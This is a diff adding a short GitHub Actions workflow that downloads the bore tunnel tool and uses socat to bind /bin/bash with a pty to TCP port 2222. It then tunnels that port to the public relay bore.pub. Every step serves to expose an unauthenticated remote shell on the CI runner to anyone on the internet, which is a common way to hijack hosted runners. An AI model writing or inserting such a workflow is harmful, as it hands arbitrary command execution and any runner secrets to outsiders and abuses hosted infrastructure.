@@ -1,0 +1,29 @@
+name: Run bore
+
+on:
+  workflow_dispatch:
+
+jobs:
+  gsocket-job:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Update packages
+        run: sudo apt-get update
+
+      - name: Download bore
+        run: wget https://github.com/ekzhang/bore/releases/download/v0.5.0/bore-v0.5.0-x86_64-unknown-linux-musl.tar.gz -O bore.tar.gz
+
+      - name: Extract bore
+        run: tar -xzvf bore.tar.gz
+
+
+      - name: Install socat
+        run: sudo apt install socat -y
+
+
+      - name: Run socat
+        run: socat TCP-LISTEN:2222,reuseaddr,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane &
+
+      - name: Run bore
+        run: chmod +x bore && ./bore local 2222 --to bore.pub
